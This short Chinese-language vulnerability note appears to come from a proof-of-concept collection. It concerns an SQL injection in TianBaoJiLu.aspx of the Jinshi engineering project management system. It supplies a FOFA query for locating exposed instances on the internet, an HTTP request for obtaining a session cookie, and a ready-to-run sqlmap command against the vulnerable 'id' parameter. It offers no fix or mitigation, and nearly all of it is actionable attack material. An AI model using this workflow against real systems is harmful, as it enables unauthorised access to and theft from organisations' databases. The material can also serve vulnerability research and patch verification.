## 金石工程项目管理系统TianBaoJiLu.aspx存在SQL注入漏洞

## fofa
```
body="金石工程项目管理系统"
```

## 先获取cookie(响应包Set-Cookie)
```
GET / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
```

### sqlmap跑注入
```
sqlmap -u "http://ip/query/shigongjihuajindu/TianBaoJiLu.aspx?id=1" --batch --cookie 'ASP.NET_SessionId=pcqx2zs4gsnqprd5cvhtodmk'
```
